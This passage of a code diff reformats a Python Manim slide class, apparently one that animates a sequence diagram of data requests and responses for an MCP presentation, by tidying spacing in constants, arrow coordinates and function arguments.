+            (1, 3, "6. Request data", False, False),
+            (3, 1, "7. Data response", True, False),
+            (1, 0, "8. Retrieved data", True, False),
+            (0, 2, "9. User query + retrieved data", False, False),
+            (2, 0, "10. Final response", True, False),
         ]
 
-        MSG_Y0   =  1.60
-        MSG_STEP =  0.50
-        PAD      =  0.28   # gap between lifeline and arrow tip/tail
+        MSG_Y0 = 1.60
+        MSG_STEP = 0.50
+        PAD = 0.28  # gap between lifeline and arrow tip/tail
 
         for i, (src, dst, label, is_return, is_internal) in enumerate(messages):
-            y  = MSG_Y0 - i * MSG_STEP
+            y = MSG_Y0 - i * MSG_STEP
             xs = COL_X[src]
             xd = COL_X[dst]
 
@@ -1691,7 +1819,7 @@ class MCPPresentation(Slide):
             if is_internal:
                 loop = CurvedArrow(
                     start_point=[xs + 0.15, y + 0.18, 0],
-                    end_point  =[xs + 0.15, y - 0.18, 0],
+                    end_point=[xs + 0.15, y - 0.18, 0],
                     angle=-TAU / 4,
                     color=ORANGE,
                     stroke_width=1.5,
@@ -1702,12 +1830,13 @@ class MCPPresentation(Slide):
 
             # ── directional arrow ──────────────────────────────────────────────
             color = SEC if is_return else CRAIL
-            sign  = 1 if xd > xs else -1
+            sign = 1 if xd > xs else -1
             x_from = xs + sign * PAD
-            x_to   = xd - sign * PAD
+            x_to = xd - sign * PAD
 
             raw = Arrow(
-                [x_from, y, 0], [x_to, y, 0],
+                [x_from, y, 0],
+                [x_to, y, 0],
                 buff=0,
                 color=color,
                 stroke_width=1.8,
